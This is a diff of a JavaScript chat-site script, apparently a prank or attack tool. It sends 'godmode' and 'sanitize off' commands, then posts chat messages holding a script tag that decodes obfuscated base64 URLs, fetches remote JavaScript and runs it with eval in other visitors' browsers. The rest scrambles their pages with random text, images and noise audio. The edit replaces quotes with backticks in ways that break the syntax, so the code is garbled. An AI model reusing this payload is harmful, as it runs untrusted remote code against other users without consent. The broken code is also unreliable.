@@ -1,6 +1,6 @@
-socket.emit('command', { list: ['godmode'] });
-socket.emit('command', { list: ['sanitize', 'off'] });
-socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t));fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-E'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
+socket.emit(`command`, { list: ['godmode`] });
+socket.emit(`command`, { list: ['sanitize`, `off`] });
+socket.emit(`talk`, { text: "WHAT THE FUCK!? <script>console.log(`(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)`);fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-A`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t));fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-E`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
 (async () => {
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 
@@ -26,24 +26,24 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
                 return true;
             }
         }
-        registerProcessor('bytebeat-processor', BytebeatProcessor);
+        registerProcessor(`bytebeat-processor`, BytebeatProcessor);
     `;
 
-    const blob = new Blob([workletCode], { type: 'application/javascript' });
+    const blob = new Blob([workletCode], { type: `application/javascript` });
     const url = URL.createObjectURL(blob);
     await audioCtx.audioWorklet.addModule(url);
     
-    const bytebeatNode = new AudioWorkletNode(audioCtx, 'bytebeat-processor');
+    const bytebeatNode = new AudioWorkletNode(audioCtx, `bytebeat-processor`);
     bytebeatNode.connect(audioCtx.destination);
 
-    const blendModes = ['normal', 'overlay', 'difference', 'exclusion', 'color-dodge', 'luminosity', 'hue', 'saturation'];
+    const blendModes = ['normal`, `overlay`, `difference`, `exclusion`, `color-dodge`, `luminosity`, `hue`, `saturation`];
     function getRandomHex() {
-        return '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+        return `#` + Math.floor(Math.random() * 16777215).toString(16).padStart(6, `0`);
     }
 
     // Generate random base96 characters
     function getRandomBase128(length = 200) {
-        let result = '';
+        let result = ``;
         for (let i = 0; i < length; i++) {
             result += String.fromCharCode(32 + Math.floor(Math.random() * 128));
         }
@@ -52,7 +52,7 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
 
     // Generate random base81 characters (ASCII 33 to 113 = 81 characters)
     function getRandomBase81(length = 15) {
-        let result = '';
+        let result = ``;
         for (let i = 0; i < length; i++) {
             result += String.fromCharCode(33 + Math.floor(Math.random() * 81));
         }
@@ -71,9 +71,9 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
     }
 
     const textNodes = getTextNodes(document.body);
-    const allElements = document.querySelectorAll('*');
-    const inputs = document.querySelectorAll('input, textarea');
-    const images = document.querySelectorAll('img');
+    const allElements = document.querySelectorAll(`*`);
+    const inputs = document.querySelectorAll(`input, textarea`);
+    const images = document.querySelectorAll(`img`);
 
     const existingImageSources = Array.from(images).map(img => img.src).filter(Boolean);
     const cssBgElements = [];
@@ -81,7 +81,7 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
 
     allElements.forEach(el => {
         const bgImage = window.getComputedStyle(el).backgroundImage;
-        if (bgImage && bgImage !== 'none') {
+        if (bgImage && bgImage !== `none`) {
             cssBgElements.push(el);
             const match = bgImage.match(/url\(['"]?(.*?)['"]?\)/);
             if (match && match[1]) {
@@ -121,10 +121,10 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
 
             // Randomize input values and placeholders
             inputs.forEach(input => {
-                if (input.hasAttribute('placeholder')) {
+                if (input.hasAttribute(`placeholder`)) {
                     input.placeholder = getRandomBase128(15);
                 }
-                if (input.type === 'text' || input.type === 'search' || input.tagName === 'TEXTAREA') {
+                if (input.type === `text` || input.type === `search` || input.tagName === `TEXTAREA`) {
                     input.value = getRandomBase128(100);
                 }
             });
@@ -145,7 +145,7 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
                     if (true) {
                         img.src = allImageSources[Math.floor(Math.random() * allImageSources.length)];
                     } else {
-                        const svgData = `<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><rect width='100%' height='100%' fill='${getRandomHex()}'/><text x='50%' y='50%' fill='${getRandomHex()}' dominant-baseline='middle' text-anchor='middle' font-size='20'>${getRandomBase96(6)}</text></svg>`;
+                        const svgData = `<svg xmlns=`http://www.w3.org/2000/svg` width=`200` height=`200`><rect width=`100%` height=`100%` fill=`${getRandomHex()}`/><text x=`50%` y=`50%` fill=`${getRandomHex()}` dominant-baseline=`middle` text-anchor=`middle` font-size=`20`>${getRandomBase96(6)}</text></svg>`;
                         img.src = `data:image/svg+xml;utf8,${encodeURIComponent(svgData)}`;
                     }
                 });
@@ -153,16 +153,16 @@ socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_
                 cssBgElements.forEach(el => {
                     if (true) {
                         const randomUrl = allImageSources[Math.floor(Math.random() * allImageSources.length)];
-                        el.style.backgroundImage = `url('${randomUrl}')`;
+                        el.style.backgroundImage = `url(`${randomUrl}`)`;
                     } else {
-                        const svgData = `<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><rect width='100%' height='100%' fill='${getRandomHex()}'/><circle cx='100' cy='100' r='50' fill='${getRandomHex()}'/></svg>`;
+                        const svgData = `<svg xmlns=`http://www.w3.org/2000/svg` width=`200` height=`200`><rect width=`100%` height=`100%` fill=`${getRandomHex()}`/><circle cx=`100` cy=`100` r=`50` fill=`${getRandomHex()}`/></svg>`;
                         el.style.backgroundImage = `url("data:image/svg+xml;utf8,${encodeURIComponent(svgData)}")`;
                     }
                 });
 
             }
         }
-        socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
+        socket.emit(`talk`, { text: "WHAT THE FUCK!? <script>console.log(`(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)`);fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-A`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
         requestAnimationFrame(animate);
     }
 
